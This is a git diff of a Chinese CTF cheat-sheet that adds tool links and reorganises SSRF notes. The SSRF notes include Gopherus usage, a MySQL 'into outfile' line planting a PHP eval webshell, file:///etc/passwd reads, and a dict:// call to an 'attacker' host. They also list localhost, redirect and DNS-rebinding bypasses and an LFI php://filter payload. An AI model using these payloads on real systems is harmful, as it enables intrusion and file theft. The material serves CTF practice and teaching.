@@ -4,6 +4,7 @@
 ## CTF项目
 
 - CTF Wiki：https://ctf-wiki.org/
+- CTF Hub：https://www.ctfhub.com/
 - CTF Time：https://ctftime.org/
 - 攻防世界：https://adworld.xctf.org.cn/
 - Hacker 101：https://www.hacker101.com/
@@ -39,12 +40,15 @@
 - Base64填充位隐写读取：https://github.com/cjcslhp/wheels/tree/master/b64stego
 - yafu：RSA解题中的因式分解 https://github.com/bbuhrow/yafu
 - factordb：在线大数分解数据库 http://factordb.com/
+- ctfcode：随波逐流工作室 CTF编码工具 http://1o1o.xyz/bo_ctfcode.html
 
 ### Misc
 
 #### 图片
 
 - Stegsolve：图片隐写 http://www.caesum.com/handbook/stego.ht
+- Stegonline：在线图片隐写 https://stegonline.georgeom.net/upload
+- Ezgif：在线分帧 https://ezgif.com/split
 - 图虫在线EXIF查看器：https://exif.tuchong.com/
 - EXIF查看器：exiftool https://exiftool.org/
 - 盲水印提取：https://github.com/chishaxie/BlindWaterMark
@@ -595,29 +599,26 @@ git stash list
 git stash pop
 ```
 
-##### .svn 信息泄露
+#### SSRF
 
-- 
-
-#### localhost绕过
+##### Gopherus
 
 ```
-http://127.0.0.1:80
-http://localhost:22
-http://[::]:80/  >>>  http://127.0.0.1
-http://example.com@127.0.0.1
-http://127.0.0.1.xip.io/
-http://127。0。0。1  >>>  http://127.0.0.1
-http://0/
-
-# 十六进制、八进制转换
-http://127.0.0.1  >>>  http://0177.0.0.1/
-
-# 转换为小数 https://www.browserling.com/tools/ip-to-dec
-http://127.0.0.1  >>>  http://2130706433/
+## Usage
+|        Command           |        Description             |
+|--------------------------|--------------------------------| 
+|  gopherus --exploit      |    Arguments can be  :         |
+|                          |    --exploit mysql             |
+|                          |    --exploit postgresql        |
+|                          |    --exploit fastcgi           |
+|                          |    --exploit redis             |
+|                          |    --exploit zabbix            |
+|                          |    --exploit pymemcache        |
+|                          |    --exploit rbmemcache        |
+|                          |    --exploit phpmemcache       |
+|                          |    --exploit dmpmemcache       |
+|                          |    --exploit smtp              |
 ```
-
-#### Gopherus
 
 ```
 # mysql
@@ -631,11 +632,9 @@ Give query to execute: select "<?php phpinfo();?>" into outfile "/var/www/html/g
 select "<?php @eval($_POST[c]);?>" into outfile "/var/www/html/gopher.php"
 ```
 
-#### SSRF payload
+##### file/http/dict协议
 
-- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#http)
-
-##### file
+- file
 
 ```
 file://path/to/file
@@ -644,7 +643,7 @@ file://\/\/etc/passwd
 ssrf.php?url=file:///etc/passwd
 ```
 
-##### http
+- http
 
 ```
 ssrf.php?url=http://127.0.0.1:22
@@ -652,14 +651,52 @@ ssrf.php?url=http://127.0.0.1:80
 ssrf.php?url=http://127.0.0.1:443
 ```
 
-##### dict
+- dict
 
 ```
 dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
 ssrf.php?url=dict://attacker:11111/
 ```
 
-#### LFI payload
+##### Bypass
+
+- URL Bypass
+
+```
+?url=http://notfound.ctfhub.com@127.0.0.1/flag.php
+```
+
+- IP Bypass
+
+```
+?url=http://127.0.0.1:80
+?url=http://localhost:22
+?url=http://[::]:80/  >>>  ?url=http://127.0.0.1
+?url=http://example.com@127.0.0.1
+?url=http://127.0.0.1.xip.io/
+?url=http://127。0。0。1  >>>  ?url=http://127.0.0.1
+?url=http://0/
+
+# 十六进制、八进制转换
+http://127.0.0.1  >>>  http://0177.0.0.1/
+
+# 转换为小数 https://www.browserling.com/tools/ip-to-dec
+http://127.0.0.1  >>>  http://2130706433/
+```
+
+- 302 Redirector Bypass（互联网上的`sudo.cc`服务默认重定向`127.0.0.1`）
+
+```
+?url=http://sudo.cc/flag.php
+```
+
+- DNS重绑定：https://lock.cmpxchg8b.com/rebinder.html
+
+```
+?url=http://7f000001.c0a80001.rbndr.us/flag.php
+```
+
+#### 本地文件包含
 
 ```
 index.php?path=php://filter/read=convert.base64-encode/resource=flag.php
